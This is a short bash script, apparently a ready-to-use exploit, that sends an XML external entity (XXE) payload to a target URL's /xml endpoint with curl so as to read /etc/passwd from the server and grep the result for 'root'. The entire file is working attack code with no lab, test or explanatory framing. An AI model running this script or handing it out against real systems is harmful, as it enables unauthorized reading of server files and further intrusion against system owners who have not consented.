#!/bin/bash

# Usage: ./xxe_exploit.sh <target_url>
TARGET_URL=$1

if [ -z "$TARGET_URL" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

echo "Exploiting XXE on $TARGET_URL..."

# XXE payload to read /etc/passwd
PAYLOAD='<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>'

# Send the payload
curl -s -X POST "$TARGET_URL/xml" -d "$PAYLOAD" | grep -i "root"

echo "XXE exploit attempt completed."
